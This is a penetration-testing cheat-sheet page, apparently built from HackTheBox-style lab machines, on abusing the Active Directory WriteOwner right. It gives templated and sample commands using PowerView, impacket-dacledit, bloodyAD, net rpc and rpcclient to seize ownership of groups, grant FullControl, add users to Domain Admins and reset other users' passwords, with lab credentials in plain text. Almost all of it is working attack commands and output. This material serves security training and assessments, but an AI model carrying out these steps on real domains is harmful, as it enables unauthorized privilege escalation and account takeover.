---
title: "WriteOwner/Own"
date: 2025-7-17
tags: ["WriteOwner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit", "Own"]
---

### Abuse #1 : Change Owner of the Group/User

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Powerview.py

```console
# Password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB'                                  
╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
╰─PV ❯
```

```console
# NTLM
powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
```

#### 2. Change Owner

```console
Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>'
```

```console {class="sample-code"}
╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
╰─PV ❯ Set-DomainObjectOwner -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader'
[2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103
[2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
```

#### 2. Change Owner

```console
Set-DomainObjectOwner -Identity '<TARGET_IDENTITY>' -OwnerIdentity '<TARGET_USER>'
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Set-DomainObjectOwner -Identity 'DOMAIN ADMINS' -OwnerIdentity 'maria'
```

{{< /tabcontent >}}

---

### Abuse #2 : Add User to the Group

{{< tab set2 tab1 >}}Linux{{< /tab >}}{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{<  tabcontent set2 tab1  >}}

#### 1. Add Full Control to the User Over the Group

{{< tab set2-1 tab1 active >}}impacket{{< /tab >}}{{< tab set2-1 tab2 >}}bloodyAD{{< /tab >}}{{< tab set2-1 tab3 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

```console
# Password
impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ impacket-dacledit 'CERTIFIED.HTB/judith.mader:judith09' -dc-ip DC01.CERTIFIED.HTB -principal 'judith.mader' -target 'Management' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250717-032157.bak
[*] DACL modified successfully!
```

```console
# NTLM
impacket-dacledit '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console
# Kerberos
sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal '<USER>' -target '<TARGET_IDENTITY>' -inheritance -action write -rights FullControl
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal 'm.lovegod' -target 'NETWORK AUDIT' -inheritance -action write -rights FullControl
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240924-021507.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d CERTIFIED.HTB -u 'judith.mader' -p 'judith09' --host DC01.CERTIFIED.HTB add genericAll 'Management' 'judith.mader'
[+] judith.mader has now GenericAll on Management
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -P ':<HASH>' -f rc4 --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console
# Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '<TARGET_IDENTITY>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
[+] m.lovegod has now GenericAll on NETWORK AUDIT
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab3 >}}

```console
# Password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB'                                  
╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
╰─PV ❯
```

```console
# NTLM
powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>'
```

```console
Add-DomainObjectAcl -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console {class=sample-code}
╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader' -Rights fullcontrol
[2025-07-17 03:24:17] [Add-DomainObjectACL] Found target identity: CN=Management,CN=Users,DC=certified,DC=htb
[2025-07-17 03:24:17] [Add-DomainObjectACL] Found principal identity: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[2025-07-17 03:24:17] Adding FullControl to S-1-5-21-729746778-2675978091-3820388244-1104
[2025-07-17 03:24:17] [Add-DomainObjectACL] Success! Added ACL to CN=Management,CN=Users,DC=certified,DC=htb
```

{{< /tabcontent >}}

#### 2. Add User to the Group

{{< tab set2-2 tab1 active >}}rpc{{< /tab >}}{{< tab set2-2 tab2 >}}bloodyAD{{< /tab >}}{{< tab set2-2 tab3 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-2 tab1 >}}

```console
# Request a TGT
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && impacket-getTGT 'absolute.htb/m.lovegod'                                                                  
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in m.lovegod.ccache
```

```console
export KRB5CCNAME=<USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=m.lovegod.ccache
```

```console
sudo ntpdate -s <DC_IP> && net rpc group addmem '<GROUP>' '<USER>' -U '<USER>@<DOMAIN>%<PASSWORD>' --use-kerberos=required -S <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && net rpc group addmem 'NETWORK AUDIT' 'm.lovegod' -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
```

{{< /tabcontent >}}
{{< tabcontent set2-2 tab2 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d CERTIFIED.HTB -u 'judith.mader' -p 'judith09' --host DC01.CERTIFIED.HTB add groupMember 'Management' 'judith.mader'
[+] judith.mader added to Management
```

```console
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console
# Kerberos
sudo ntpdate -s <DC_IP> && bloodyAD -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -k -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

{{< /tabcontent >}}
{{< tabcontent set2-2 tab3 >}}

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

{{< /tabcontent >}}

#### 3. Check

{{< tab set2-3 tab1 active >}}rpc{{< /tab >}}{{< tab set2-3 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set2-3 tab1 >}}

```console
sudo ntpdate -s <DC_IP> && net rpc group members '<GROUP>' -U '<USER>@<DOMAIN>%<PASSWORD>' --use-kerberos=required -S <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && net rpc group members 'NETWORK AUDIT' -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set2-3 tab2 >}}

```console
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>]
╰─PV ❯ Get-DomainGroupMember -Identity 'Management'
GroupDomainName             : Management
GroupDistinguishedName      : CN=Management,CN=Users,DC=certified,DC=htb
MemberDomain                : certified.htb
MemberName                  : judith.mader
MemberDistinguishedName     : CN=Judith Mader,CN=Users,DC=certified,DC=htb
MemberSID                   : S-1-5-21-729746778-2675978091-3820388244-1103

GroupDomainName             : Management
GroupDistinguishedName      : CN=Management,CN=Users,DC=certified,DC=htb
MemberDomain                : certified.htb
MemberName                  : management_svc
MemberDistinguishedName     : CN=management service,CN=Users,DC=certified,DC=htb
MemberSID                   : S-1-5-21-729746778-2675978091-3820388244-1105
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add User to the Group

```console
Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity '<USER>' -Rights All -DomainController <DC> -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Add-DomainObjectAcl -TargetIdentity 'DOMAIN ADMINS' -PrincipalIdentity 'maria' -Rights All -DomainController jenkins.object.local
```

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

#### 4. Check

```console
Get-DomainGroupMember -Identity '<GROUP>' -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> Get-DomainGroupMember -Identity 'DOMAIN ADMINS' -Domain object.local -DomainController jenkins.object.local | fl MemberName

MemberName : maria

MemberName : Administrator
```

```console
# Or
net user <USER>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:33 PM
Password expires             Never
Password changeable          10/22/2021 9:16:33 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/23/2024 2:24:00 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```

```console
# Exit current sessions or re-login
whoami /groups
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\maria> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users               Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OBJECT\Domain Admins                          Group            S-1-5-21-4088429403-1159899800-2753317549-512 Mandatory group, Enabled by default, Enabled group
OBJECT\Denied RODC Password Replication Group Alias            S-1-5-21-4088429403-1159899800-2753317549-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level          Label            S-1-16-12288
```

{{< /tabcontent >}}

---

### Abuse #3 : Change Target User Password (From Linux)

{{< tab set3 tab1 >}}BloodyAD{{< /tab >}}
{{< tab set3 tab2 >}}rpcclient{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
[+] Password changed successfully!
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>'
```

```console {class="sample-code"}
$ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Test1234'
```

{{< /tabcontent >}}

### Abuse #3 : Change Target User Password (From Windows)

{{< tab set4 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Change Target User Password

```console
$password = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password -Credential $Cred
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
```

{{< /tabcontent >}}

